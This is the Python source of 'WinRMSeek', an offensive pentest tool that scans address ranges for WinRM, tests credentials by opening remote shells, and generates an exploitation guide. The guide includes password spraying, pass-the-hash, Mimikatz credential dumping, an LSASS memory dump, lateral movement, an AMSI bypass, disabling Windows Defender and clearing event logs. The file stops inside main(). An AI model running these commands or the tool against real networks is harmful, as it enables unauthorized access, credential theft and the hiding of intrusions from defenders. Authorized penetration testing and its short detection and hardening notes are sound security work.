#!/usr/bin/env python3
"""
WinRMSeek v1.1 - Windows Remote Management Discovery & Connection Testing
Find and enumerate WinRM/PSRemoting enabled hosts with credential validation

Features:
- WinRM port scanning (5985 HTTP, 5986 HTTPS)
- WinRM service detection
- ✨ ACTUAL CONNECTION TESTING with command execution
- ✨ Hostname and OS information extraction
- ✨ Comprehensive WinRM exploitation guide generation
- PowerShell remoting capability detection
- Integration with evil-winrm
- Full credential validation with whoami output

Usage:
    ./winrmseek.py iplist.txt                         # Basic WinRM discovery
    ./winrmseek.py iplist.txt -t -u user -p pass     # Test connections with creds
    ./winrmseek.py iplist.txt --ssl                   # HTTPS only (port 5986)
    ./winrmseek.py iplist.txt -t -u admin -p P@ss -v # Verbose with connection testing
    
Output:
    winrmlist.txt            - WinRM enabled hosts
    winrm_access.txt         - Hosts with valid credentials + connection commands
    winrm_details.txt        - Detailed findings with system info
    winrm_details.json       - JSON export
    WINRM_ATTACK_GUIDE.txt   - Comprehensive exploitation guide (~800 lines)
"""

import socket
import subprocess
import sys
import json
import argparse
import requests
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning

# Import shared utilities
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from seek_utils import find_ip_list


# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Color codes
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

# WinRM ports
WINRM_PORTS = {
    5985: 'WinRM-HTTP',
    5986: 'WinRM-HTTPS'
}

# Banner
BANNER = f"""{CYAN}{BOLD}
██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗███████╗███████╗███████╗██╗  ██╗
██║    ██║██║████╗  ██║██╔══██╗████╗ ████║██╔════╝██╔════╝██╔════╝██║ ██╔╝
██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║███████╗█████╗  █████╗  █████╔╝ 
██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║╚════██║██╔══╝  ██╔══╝  ██╔═██╗ 
╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║███████║███████╗███████╗██║  ██╗
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
{YELLOW}WinRMSeek v1.1 - Windows Remote Management Discovery & Connection Testing{RESET}
{BLUE}Find and test WinRM/PSRemoting access with credential validation{RESET}
{GREEN}github.com/Lokii-git/seeksweet{RESET}
"""


def print_banner():
    """Print the tool banner"""
    print(BANNER)


def read_ip_list(file_path):
    """Read IP addresses from a file. Supports CIDR notation."""
    # Use shared utility to find the file
    file_path = find_ip_list(file_path)
    
    ips = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    ip = line.split()[0]
                    
                    # Check if it's CIDR notation
                    if '/' in ip:
                        try:
                            network = ipaddress.ip_network(ip, strict=False)
                            for host_ip in network.hosts():
                                ips.append(str(host_ip))
                        except ValueError:
                            # Not valid CIDR, treat as single IP
                            ips.append(ip)
                    else:
                        ips.append(ip)
    except Exception as e:
        print(f"{RED}[!] Error reading file {file_path}: {e}{RESET}")
    return ips


def check_port(ip, port, timeout=3):
    """Check if a port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False


def detect_winrm_http(ip, timeout=5):
    """
    Detect WinRM over HTTP using HTTP request
    Returns: True if WinRM detected
    """
    try:
        url = f'http://{ip}:5985/wsman'
        response = requests.get(url, timeout=timeout, verify=False)
        
        # WinRM typically returns 405 Method Not Allowed for GET
        # Or returns XML with wsman namespace
        if response.status_code in [401, 405] or 'wsman' in response.text.lower():
            return True
        
    except requests.exceptions.Timeout:
        pass
    except Exception:
        pass
    
    return False


def detect_winrm_https(ip, timeout=5):
    """
    Detect WinRM over HTTPS
    Returns: True if WinRM detected
    """
    try:
        url = f'https://{ip}:5986/wsman'
        response = requests.get(url, timeout=timeout, verify=False)
        
        if response.status_code in [401, 405] or 'wsman' in response.text.lower():
            return True
        
    except requests.exceptions.SSLError:
        # SSL error usually means service is there but SSL handshake failed
        return True
    except requests.exceptions.Timeout:
        pass
    except Exception:
        pass
    
    return False


def test_winrm_auth_powershell(ip, port, username, password, timeout=10):
    """
    Test WinRM authentication using PowerShell (Windows only)
    Returns: dict with auth result
    """
    result = {
        'authenticated': False,
        'method': 'powershell',
        'error': None
    }
    
    try:
        # Build PowerShell command
        ps_cmd = f'''
$password = ConvertTo-SecureString '{password}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{username}', $password)
$session = New-PSSession -ComputerName {ip} -Port {port} -Credential $cred -ErrorAction Stop
if ($session) {{
    Remove-PSSession $session
    Write-Output "SUCCESS"
}}
'''
        
        cmd = ['powershell.exe', '-Command', ps_cmd]
        proc_result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if 'SUCCESS' in proc_result.stdout:
            result['authenticated'] = True
        elif proc_result.stderr:
            result['error'] = proc_result.stderr[:100]
    
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except FileNotFoundError:
        result['error'] = 'PowerShell not found (Linux?)'
    except Exception as e:
        result['error'] = str(e)
    
    return result


def test_winrm_auth_evil_winrm(ip, username, password, ssl=False, timeout=10):
    """
    Test WinRM authentication using evil-winrm (Linux)
    Returns: dict with auth result
    """
    result = {
        'authenticated': False,
        'method': 'evil-winrm',
        'error': None
    }
    
    try:
        cmd = ['evil-winrm', '-i', ip, '-u', username, '-p', password]
        
        if ssl:
            cmd.append('-S')
        
        # Try to execute 'whoami' command
        cmd.extend(['-e', 'whoami'])
        
        proc_result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if proc_result.returncode == 0 or 'Evil-WinRM shell' in proc_result.stdout:
            result['authenticated'] = True
        else:
            result['error'] = 'Authentication failed'
    
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except FileNotFoundError:
        result['error'] = 'evil-winrm not found'
    except Exception as e:
        result['error'] = str(e)
    
    return result


def test_winrm_auth_pywinrm(ip, port, username, password, timeout=10):
    """
    Test WinRM authentication using pywinrm library
    Returns: dict with auth result, hostname, and OS info
    """
    result = {
        'authenticated': False,
        'method': 'pywinrm',
        'error': None,
        'hostname': None,
        'os_info': None,
        'username_used': username
    }
    
    try:
        from winrm.protocol import Protocol
        
        protocol = 'https' if port == 5986 else 'http'
        endpoint = f'{protocol}://{ip}:{port}/wsman'
        
        p = Protocol(
            endpoint=endpoint,
            transport='ntlm',
            username=username,
            password=password,
            server_cert_validation='ignore'
        )
        
        # Try to open a shell and execute whoami
        shell_id = p.open_shell(timeout=timeout)
        
        if shell_id:
            try:
                # Execute whoami to verify access
                command_id = p.run_command(shell_id, 'whoami')
                std_out, std_err, status_code = p.get_command_output(shell_id, command_id)
                
                if status_code == 0:
                    result['authenticated'] = True
                    result['whoami'] = std_out.decode('utf-8').strip() if std_out else username
                    
                    # Try to get hostname
                    try:
                        command_id = p.run_command(shell_id, 'hostname')
                        std_out, std_err, status_code = p.get_command_output(shell_id, command_id)
                        if status_code == 0 and std_out:
                            result['hostname'] = std_out.decode('utf-8').strip()
                    except:
                        pass
                    
                    # Try to get OS info
                    try:
                        command_id = p.run_command(shell_id, 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"')
                        std_out, std_err, status_code = p.get_command_output(shell_id, command_id)
                        if status_code == 0 and std_out:
                            result['os_info'] = std_out.decode('utf-8').strip()
                    except:
                        pass
                
                p.cleanup_command(shell_id, command_id)
            finally:
                p.close_shell(shell_id)
    
    except ImportError:
        result['error'] = 'pywinrm not installed (pip install pywinrm)'
    except Exception as e:
        error_msg = str(e)
        if 'Unauthorized' in error_msg or '401' in error_msg:
            result['error'] = 'Authentication failed (invalid credentials)'
        elif 'Forbidden' in error_msg or '403' in error_msg:
            result['error'] = 'Access denied (valid creds but insufficient privileges)'
        elif 'timeout' in error_msg.lower():
            result['error'] = 'Connection timeout'
        elif 'Connection refused' in error_msg:
            result['error'] = 'Connection refused (WinRM not enabled?)'
        else:
            result['error'] = error_msg[:150]
    
    return result


def scan_host(ip, args):
    """
    Scan a single host for WinRM
    Returns: dict with findings
    """
    result = {
        'ip': ip,
        'winrm_http': False,
        'winrm_https': False,
        'authenticated': False,
        'open_ports': [],
        'status': 'closed'
    }
    
    try:
        # Check HTTP port (5985)
        if not args.ssl_only:
            if check_port(ip, 5985, timeout=args.timeout):
                result['open_ports'].append(5985)
                result['status'] = 'open'
                
                if detect_winrm_http(ip, timeout=args.timeout):
                    result['winrm_http'] = True
        
        # Check HTTPS port (5986)
        if check_port(ip, 5986, timeout=args.timeout):
            result['open_ports'].append(5986)
            result['status'] = 'open'
            
            if detect_winrm_https(ip, timeout=args.timeout):
                result['winrm_https'] = True
        
        # Test authentication if credentials provided
        if args.test_auth and args.username and args.password:
            if result['winrm_http'] or result['winrm_https']:
                port = 5985 if result['winrm_http'] else 5986
                
                # Try pywinrm first (cross-platform)
                auth_result = test_winrm_auth_pywinrm(ip, port, args.username, args.password, timeout=args.timeout)
                
                if auth_result['authenticated']:
                    result['authenticated'] = True
                    result['auth_method'] = auth_result['method']
                    result['whoami'] = auth_result.get('whoami')
                    result['hostname'] = auth_result.get('hostname')
                    result['os_info'] = auth_result.get('os_info')
                else:
                    result['auth_error'] = auth_result.get('error')
    
    except KeyboardInterrupt:
        raise
    except Exception as e:
        result['error'] = str(e)
    
    return result


def save_winrmlist(results, filename='winrmlist.txt'):
    """Save list of WinRM enabled hosts"""
    try:
        with open(filename, 'w') as f:
            for result in results:
                if result['winrm_http'] or result['winrm_https']:
                    f.write(f"{result['ip']}\n")
        print(f"{GREEN}[+] WinRM host list saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving WinRM list: {e}{RESET}")


def save_access_list(results, username, password, filename='winrm_access.txt'):
    """Save list of hosts with valid credentials"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("WINRMSEEK - Hosts with Valid WinRM Access\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Credentials: {username}:<password>\n")
            f.write("=" * 80 + "\n\n")
            
            for result in results:
                if result['authenticated']:
                    protocol = 'https' if result['winrm_https'] else 'http'
                    port = 5986 if result['winrm_https'] else 5985
                    
                    f.write(f"\n{'=' * 80}\n")
                    f.write(f"Host: {result['ip']}\n")
                    if result.get('hostname'):
                        f.write(f"Hostname: {result['hostname']}\n")
                    f.write(f"Protocol: {protocol.upper()}\n")
                    f.write(f"Port: {port}\n")
                    if result.get('whoami'):
                        f.write(f"Whoami: {result['whoami']}\n")
                    if result.get('os_info'):
                        f.write(f"\nOS Information:\n{result['os_info']}\n")
                    
                    f.write(f"\n{'─' * 80}\n")
                    f.write(f"Connection Commands:\n")
                    f.write(f"{'─' * 80}\n")
                    
                    # evil-winrm
                    f.write(f"\n[evil-winrm] Linux/Kali:\n")
                    ssl_flag = " -S" if protocol == 'https' else ""
                    f.write(f"  evil-winrm -i {result['ip']} -u {username} -p '{password}'{ssl_flag}\n")
                    
                    # PowerShell
                    f.write(f"\n[PowerShell] Windows:\n")
                    f.write(f"  $cred = Get-Credential\n")
                    f.write(f"  Enter-PSSession -ComputerName {result['ip']} -Port {port} -Credential $cred")
                    if protocol == 'https':
                        f.write(" -UseSSL")
                    f.write("\n")
                    
                    # pywinrm
                    f.write(f"\n[Python] pywinrm:\n")
                    f.write(f"  from winrm.protocol import Protocol\n")
                    f.write(f"  endpoint = '{protocol}://{result['ip']}:{port}/wsman'\n")
                    f.write(f"  p = Protocol(endpoint=endpoint, transport='ntlm',\n")
                    f.write(f"               username='{username}', password='<password>')\n")
                    f.write(f"  shell_id = p.open_shell()\n")
                    
                    f.write(f"\n{'=' * 80}\n")
        
        print(f"{GREEN}[+] Access list saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving access list: {e}{RESET}")


def save_details(results, filename='winrm_details.txt'):
    """Save detailed scan results"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("WINRMSEEK - Detailed Scan Results\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            for result in results:
                if result['status'] == 'open':
                    f.write(f"\n{'=' * 80}\n")
                    f.write(f"Host: {result['ip']}\n")
                    if result.get('hostname'):
                        f.write(f"Hostname: {result['hostname']}\n")
                    f.write(f"{'=' * 80}\n")
                    
                    f.write(f"Open Ports: {', '.join(map(str, result['open_ports']))}\n")
                    
                    if result['winrm_http']:
                        f.write(f"WinRM HTTP: ✓ (port 5985)\n")
                    
                    if result['winrm_https']:
                        f.write(f"WinRM HTTPS: ✓ (port 5986)\n")
                    
                    if result.get('authenticated'):
                        f.write(f"\nAuthentication: ✓ SUCCESS\n")
                        f.write(f"Method: {result.get('auth_method', 'N/A')}\n")
                        if result.get('whoami'):
                            f.write(f"Whoami: {result['whoami']}\n")
                        if result.get('os_info'):
                            f.write(f"\nOS Information:\n{result['os_info']}\n")
                    elif result.get('auth_error'):
                        f.write(f"\nAuthentication: ✗ FAILED\n")
                        f.write(f"Error: {result['auth_error']}\n")
                    
                    f.write("\n")
        
        print(f"{GREEN}[+] Detailed results saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving details: {e}{RESET}")


def save_json(results, filename='winrm_details.json'):
    """Save results as JSON"""
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"{GREEN}[+] JSON results saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving JSON: {e}{RESET}")


def generate_winrm_guide(results, args, filename='WINRM_ATTACK_GUIDE.txt'):
    """
    Generate comprehensive WinRM exploitation guide
    """
    try:
        winrm_hosts = [r for r in results if r['winrm_http'] or r['winrm_https']]
        auth_hosts = [r for r in results if r.get('authenticated')]
        
        with open(filename, 'w') as f:
            f.write("=" * 100 + "\n")
            f.write(" " * 30 + "WINRM EXPLOITATION GUIDE\n")
            f.write("=" * 100 + "\n\n")
            
            f.write("OVERVIEW\n")
            f.write("─" * 100 + "\n")
            f.write("Windows Remote Management (WinRM) is Microsoft's implementation of WS-Management Protocol.\n")
            f.write("It provides remote command execution and management capabilities similar to SSH on Linux.\n")
            f.write("WinRM is used by PowerShell Remoting and is often enabled in enterprise environments.\n\n")
            
            f.write("SCAN RESULTS SUMMARY\n")
            f.write("─" * 100 + "\n")
            f.write(f"Total WinRM Hosts Found: {len(winrm_hosts)}\n")
            f.write(f"HTTP (5985) Enabled: {len([r for r in winrm_hosts if r['winrm_http']])}\n")
            f.write(f"HTTPS (5986) Enabled: {len([r for r in winrm_hosts if r['winrm_https']])}\n")
            if args.test_auth:
                f.write(f"Accessible with Provided Creds: {len(auth_hosts)}\n")
            f.write("\n")
            
            # Accessible hosts
            if auth_hosts:
                f.write("=" * 100 + "\n")
                f.write("ACCESSIBLE WINRM HOSTS (IMMEDIATE ACCESS)\n")
                f.write("=" * 100 + "\n\n")
                
                for result in auth_hosts:
                    protocol = 'https' if result['winrm_https'] else 'http'
                    port = 5986 if result['winrm_https'] else 5985
                    
                    f.write(f"\n{'─' * 100}\n")
                    f.write(f"Host: {result['ip']}")
                    if result.get('hostname'):
                        f.write(f" ({result['hostname']})")
                    f.write(f"\n")
                    f.write(f"Protocol: {protocol.upper()} (Port {port})\n")
                    if result.get('whoami'):
                        f.write(f"Access As: {result['whoami']}\n")
                    f.write(f"{'─' * 100}\n\n")
            
            f.write("\n" + "=" * 100 + "\n")
            f.write("WINRM EXPLOITATION TECHNIQUES\n")
            f.write("=" * 100 + "\n\n")
            
            # evil-winrm
            f.write("1. EVIL-WINRM (RECOMMENDED FOR KALI/LINUX)\n")
            f.write("─" * 100 + "\n")
            f.write("evil-winrm is the most popular tool for WinRM exploitation on Linux.\n\n")
            
            f.write("Installation:\n")
            f.write("  gem install evil-winrm\n\n")
            
            f.write("Basic Usage:\n")
            f.write("  evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD\n")
            f.write("  evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD -S  # HTTPS (port 5986)\n\n")
            
            f.write("Advanced Features:\n")
            f.write("  # Upload file\n")
            f.write("  evil-winrm> upload /path/to/local/file C:\\\\path\\\\to\\\\remote\\\\file\n\n")
            f.write("  # Download file\n")
            f.write("  evil-winrm> download C:\\\\path\\\\to\\\\remote\\\\file /path/to/local/file\n\n")
            f.write("  # Load PowerShell script\n")
            f.write("  evil-winrm> menu\n")
            f.write("  evil-winrm> Bypass-4MSI\n")
            f.write("  evil-winrm> Invoke-Binary /path/to/binary.exe\n\n")
            
            f.write("Pass-the-Hash:\n")
            f.write("  evil-winrm -i TARGET_IP -u USERNAME -H NTLM_HASH\n\n")
            
            if winrm_hosts:
                f.write("Copy/Paste Commands for Discovered Hosts:\n")
                for result in winrm_hosts[:5]:  # Show first 5
                    protocol = 'https' if result['winrm_https'] else 'http'
                    ssl_flag = " -S" if protocol == 'https' else ""
                    f.write(f"  evil-winrm -i {result['ip']} -u USERNAME -p PASSWORD{ssl_flag}\n")
                if len(winrm_hosts) > 5:
                    f.write(f"  ... and {len(winrm_hosts) - 5} more (see winrmlist.txt)\n")
                f.write("\n")
            
            # PowerShell Remoting
            f.write("\n2. POWERSHELL REMOTING (WINDOWS NATIVE)\n")
            f.write("─" * 100 + "\n")
            f.write("PowerShell Remoting is the native Windows method for WinRM access.\n\n")
            
            f.write("Interactive Session:\n")
            f.write("  $cred = Get-Credential\n")
            f.write("  Enter-PSSession -ComputerName TARGET -Credential $cred\n")
            f.write("  Enter-PSSession -ComputerName TARGET -Port 5986 -UseSSL -Credential $cred\n\n")
            
            f.write("One-Liner Execution:\n")
            f.write("  Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {whoami}\n\n")
            
            f.write("Multiple Hosts:\n")
            f.write("  $targets = @('HOST1', 'HOST2', 'HOST3')\n")
            f.write("  Invoke-Command -ComputerName $targets -Credential $cred -ScriptBlock {Get-Process}\n\n")
            
            f.write("File Copy:\n")
            f.write("  $session = New-PSSession -ComputerName TARGET -Credential $cred\n")
            f.write("  Copy-Item -Path C:\\\\local\\\\file.txt -Destination C:\\\\remote\\\\file.txt -ToSession $session\n")
            f.write("  Remove-PSSession $session\n\n")
            
            # pywinrm
            f.write("\n3. PYWINRM (PYTHON LIBRARY)\n")
            f.write("─" * 100 + "\n")
            f.write("Python library for WinRM automation and scripting.\n\n")
            
            f.write("Installation:\n")
            f.write("  pip install pywinrm\n\n")
            
            f.write("Basic Usage:\n")
            f.write("  from winrm.protocol import Protocol\n\n")
            f.write("  endpoint = 'http://TARGET_IP:5985/wsman'\n")
            f.write("  p = Protocol(endpoint=endpoint, transport='ntlm',\n")
            f.write("               username='USERNAME', password='PASSWORD')\n\n")
            f.write("  shell_id = p.open_shell()\n")
            f.write("  command_id = p.run_command(shell_id, 'ipconfig')\n")
            f.write("  std_out, std_err, status_code = p.get_command_output(shell_id, command_id)\n")
            f.write("  print(std_out.decode())\n")
            f.write("  p.cleanup_command(shell_id, command_id)\n")
            f.write("  p.close_shell(shell_id)\n\n")
            
            # Credential attacks
            f.write("\n4. CREDENTIAL ATTACKS\n")
            f.write("─" * 100 + "\n\n")
            
            f.write("A. Password Spraying:\n")
            f.write("  # CrackMapExec\n")
            f.write("  crackmapexec winrm TARGET_IP -u users.txt -p PASSWORD --continue-on-success\n")
            f.write("  crackmapexec winrm SUBNET/24 -u USERNAME -p passwords.txt\n\n")
            
            f.write("B. Pass-the-Hash:\n")
            f.write("  # evil-winrm\n")
            f.write("  evil-winrm -i TARGET_IP -u USERNAME -H NTLM_HASH\n\n")
            f.write("  # CrackMapExec\n")
            f.write("  crackmapexec winrm TARGET_IP -u USERNAME -H NTLM_HASH\n\n")
            
            f.write("C. Kerberos Authentication:\n")
            f.write("  # With TGT\n")
            f.write("  export KRB5CCNAME=/path/to/ticket.ccache\n")
            f.write("  evil-winrm -i TARGET_IP -r DOMAIN.LOCAL\n\n")
            
            # Post-exploitation
            f.write("\n5. POST-EXPLOITATION\n")
            f.write("─" * 100 + "\n\n")
            
            f.write("A. Enumeration:\n")
            f.write("  # System info\n")
            f.write("  systeminfo\n")
            f.write("  whoami /all\n")
            f.write("  net user\n")
            f.write("  net localgroup administrators\n\n")
            
            f.write("  # Network\n")
            f.write("  ipconfig /all\n")
            f.write("  netstat -ano\n")
            f.write("  arp -a\n\n")
            
            f.write("  # Processes\n")
            f.write("  Get-Process\n")
            f.write("  Get-Service\n\n")
            
            f.write("B. Credential Harvesting:\n")
            f.write("  # Mimikatz via evil-winrm\n")
            f.write("  evil-winrm> upload /path/to/mimikatz.exe\n")
            f.write("  evil-winrm> .\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n\n")
            
            f.write("  # LSASS dump\n")
            f.write("  rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump <LSASS_PID> C:\\\\lsass.dmp full\n\n")
            
            f.write("C. Lateral Movement:\n")
            f.write("  # PowerShell remoting to other hosts\n")
            f.write("  Enter-PSSession -ComputerName OTHER_HOST\n\n")
            f.write("  # Copy tools\n")
            f.write("  Copy-Item -Path .\\\\tool.exe -Destination \\\\\\\\OTHER_HOST\\\\C$\\\\Windows\\\\Temp\\\\\n\n")
            
            # CrackMapExec
            f.write("\n6. CRACKMAPEXEC WINRM MODULE\n")
            f.write("─" * 100 + "\n")
            f.write("CrackMapExec provides comprehensive WinRM functionality.\n\n")
            
            f.write("Installation:\n")
            f.write("  pipx install crackmapexec\n\n")
            
            f.write("Basic Usage:\n")
            f.write("  crackmapexec winrm TARGET_IP -u USERNAME -p PASSWORD\n")
            f.write("  crackmapexec winrm SUBNET/24 -u USERNAME -p PASSWORD\n\n")
            
            f.write("Command Execution:\n")
            f.write("  crackmapexec winrm TARGET_IP -u USERNAME -p PASSWORD -x \"whoami\"\n")
            f.write("  crackmapexec winrm TARGET_IP -u USERNAME -p PASSWORD -X \"Get-Process\"  # PowerShell\n\n")
            
            f.write("Module Execution:\n")
            f.write("  crackmapexec winrm TARGET_IP -u USERNAME -p PASSWORD -M mimikatz\n")
            f.write("  crackmapexec winrm TARGET_IP -u USERNAME -p PASSWORD -M lsassy\n\n")
            
            if winrm_hosts:
                f.write("Batch Scanning Discovered Hosts:\n")
                ips = ','.join([r['ip'] for r in winrm_hosts[:10]])
                f.write(f"  crackmapexec winrm {ips} -u USERNAME -p PASSWORD\n\n")
            
            # Defense Evasion
            f.write("\n7. DEFENSE EVASION\n")
            f.write("─" * 100 + "\n\n")
            
            f.write("AMSI Bypass (evil-winrm):\n")
            f.write("  evil-winrm> Bypass-4MSI\n\n")
            
            f.write("Disable Windows Defender:\n")
            f.write("  Set-MpPreference -DisableRealtimeMonitoring $true\n\n")
            
            f.write("Clear Event Logs:\n")
            f.write("  wevtutil cl System\n")
            f.write("  wevtutil cl Security\n")
            f.write("  wevtutil cl Application\n\n")
            
            # Detection
            f.write("\n8. DETECTION & BLUE TEAM CONSIDERATIONS\n")
            f.write("─" * 100 + "\n\n")
            
            f.write("Event IDs to Monitor:\n")
            f.write("  4624 - Successful logon (Type 3 = Network)\n")
            f.write("  4648 - Logon with explicit credentials\n")
            f.write("  4672 - Special privileges assigned to new logon\n")
            f.write("  5985/5986 - Network connection to WinRM ports\n")
            f.write("  Windows-WinRM/Operational logs\n\n")
            
            f.write("Network Indicators:\n")
            f.write("  - Connections to TCP 5985/5986\n")
            f.write("  - HTTP/HTTPS traffic to /wsman endpoint\n")
            f.write("  - NTLM authentication over HTTP\n\n")
            
            f.write("Defensive Measures:\n")
            f.write("  - Require HTTPS only (disable port 5985)\n")
            f.write("  - Restrict WinRM to specific admin hosts/VLANs\n")
            f.write("  - Implement JEA (Just Enough Administration)\n")
            f.write("  - Use certificate-based authentication\n")
            f.write("  - Monitor WinRM event logs\n")
            f.write("  - Enable enhanced PowerShell logging\n\n")
            
            # Security Configuration
            f.write("\n9. SECURE WINRM CONFIGURATION (BLUE TEAM)\n")
            f.write("─" * 100 + "\n\n")
            
            f.write("Check Current Configuration:\n")
            f.write("  winrm get winrm/config\n\n")
            
            f.write("Require HTTPS:\n")
            f.write("  winrm set winrm/config/service @{AllowUnencrypted=\"false\"}\n")
            f.write("  winrm set winrm/config/service @{CbtHardeningLevel=\"Strict\"}\n\n")
            
            f.write("Restrict Access:\n")
            f.write("  winrm set winrm/config/service @{IPv4Filter=\"192.168.1.0/24\"}\n\n")
            
            f.write("Enable Certificate Authentication:\n")
            f.write("  winrm set winrm/config/service/auth @{Certificate=\"true\"}\n\n")
            
            # References
            f.write("\n10. REFERENCES & TOOLS\n")
            f.write("─" * 100 + "\n\n")
            
            f.write("Tools:\n")
            f.write("  - evil-winrm: https://github.com/Hackplayers/evil-winrm\n")
            f.write("  - CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec\n")
            f.write("  - pywinrm: https://github.com/diyan/pywinrm\n")
            f.write("  - Impacket: https://github.com/SecureAuthCorp/impacket\n\n")
            
            f.write("Documentation:\n")
            f.write("  - Microsoft WinRM: https://docs.microsoft.com/en-us/windows/win32/winrm/portal\n")
            f.write("  - PowerShell Remoting: https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands\n")
            f.write("  - MITRE ATT&CK T1021.006: https://attack.mitre.org/techniques/T1021/006/\n\n")
            
            f.write("\n" + "=" * 100 + "\n")
            f.write("END OF GUIDE\n")
            f.write("=" * 100 + "\n")
        
        print(f"{GREEN}[+] WinRM attack guide saved to: {filename}{RESET}")
    
    except Exception as e:
        print(f"{RED}[!] Error generating WinRM guide: {e}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description='WinRMSeek - Windows Remote Management Discovery',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  ./winrmseek.py iplist.txt                     # Basic discovery
  ./winrmseek.py iplist.txt -t -u admin -p pass # Test authentication
  ./winrmseek.py iplist.txt --ssl               # HTTPS only (port 5986)
  ./winrmseek.py iplist.txt -w 20               # Fast scan (20 workers)
  
Connect to discovered hosts:
  evil-winrm -i 192.168.1.100 -u admin -p password
  evil-winrm -i 192.168.1.100 -u admin -p password -S  # HTTPS
        """
    )
    
    parser.add_argument('input_file', help='File containing IP addresses')
    parser.add_argument('-t', '--test-auth', action='store_true', help='Test authentication with provided credentials')
    parser.add_argument('-u', '--username', help='Username for authentication testing')
    parser.add_argument('-p', '--password', help='Password for authentication testing')
    parser.add_argument('--ssl-only', action='store_true', help='Only scan HTTPS port (5986)')
    parser.add_argument('-w', '--workers', type=int, default=10, help='Number of concurrent workers (default: 10)')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Read IPs
    ips = read_ip_list(args.input_file)
    
    if not ips:
        print(f"{RED}[!] No IPs to scan{RESET}")
        sys.exit(1)
    
    print(f"{CYAN}[*] Starting WinRM scan...{RESET}")
    print(f"{CYAN}[*] Targets: {len(ips)}{RESET}")
    print(f"{CYAN}[*] Workers: {args.workers}{RESET}")
    print(f"{CYAN}[*] Ports: {'5986 (HTTPS)' if args.ssl_only else '5985 (HTTP), 5986 (HTTPS)'}{RESET}")
    if args.test_auth:
        print(f"{CYAN}[*] Authentication testing: Enabled{RESET}")
    print()
    
    results = []
    
    try:
        with ThreadPoolExecutor(max_workers=args.workers) as executor:
            future_to_ip = {executor.submit(scan_host, ip, args): ip for ip in ips}
            
            for future in as_completed(future_to_ip):
                ip = future_to_ip[future]
                try:
                    result = future.result()
                    results.append(result)
                    
                    if result['winrm_http'] or result['winrm_https']:
                        services = []
                        if result['winrm_http']:
                            services.append('HTTP:5985')
                        if result['winrm_https']:
                            services.append('HTTPS:5986')
                        
                        severity = f"{GREEN}[WINRM]{RESET}"
                        msg = f"{severity} {ip}"
                        
                        if result.get('hostname'):
                            msg += f" ({result['hostname']})"
                        
                        msg += f" - {', '.join(services)}"
                        
                        if result.get('authenticated'):
                            msg += f" {GREEN}[✓ ACCESS]{RESET}"
                            if result.get('whoami'):
                                msg += f" as {result['whoami']}"
                        elif result.get('auth_error') and args.verbose:
                            msg += f" {RED}[✗ AUTH FAILED]{RESET}"
                        
                        print(msg)
                    
                    elif args.verbose:
                        print(f"{BLUE}[*]{RESET} {ip} - No WinRM")
                
                except KeyboardInterrupt:
                    print(f"\n{YELLOW}[!] Scan interrupted by user{RESET}")
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                except Exception as e:
                    if args.verbose:
                        print(f"{RED}[!]{RESET} {ip} - Error: {e}")
    
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Scan interrupted by user{RESET}")
    
    # Print summary
    print(f"\n{CYAN}{'=' * 80}{RESET}")
    print(f"{CYAN}Scan Complete{RESET}")
    print(f"{CYAN}{'=' * 80}{RESET}")
    
    winrm_hosts = len([r for r in results if r['winrm_http'] or r['winrm_https']])
    http_hosts = len([r for r in results if r['winrm_http']])
    https_hosts = len([r for r in results if r['winrm_https']])
    auth_success = len([r for r in results if r['authenticated']])
    
